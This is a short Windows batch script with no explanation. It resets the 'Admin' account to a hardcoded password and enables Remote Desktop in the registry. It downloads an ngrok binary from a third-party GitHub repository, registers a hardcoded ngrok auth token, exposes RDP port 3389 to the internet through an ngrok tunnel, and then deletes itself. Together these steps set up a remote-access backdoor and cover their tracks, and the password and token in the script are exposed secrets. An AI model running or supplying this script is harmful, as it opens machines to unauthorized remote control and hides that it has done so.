net user Admin Thuonghai001
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
curl -O https://raw.githubusercontent.com/TheDarkMythos/Ngrok-Exe/master/ngrok.exe
ngrok authtoken UqkqD5EBxWPggw7xGAiQ_77M4D5kjaPNdr9wdb3m9z
start ngrok tcp --region ap 3389
del %0
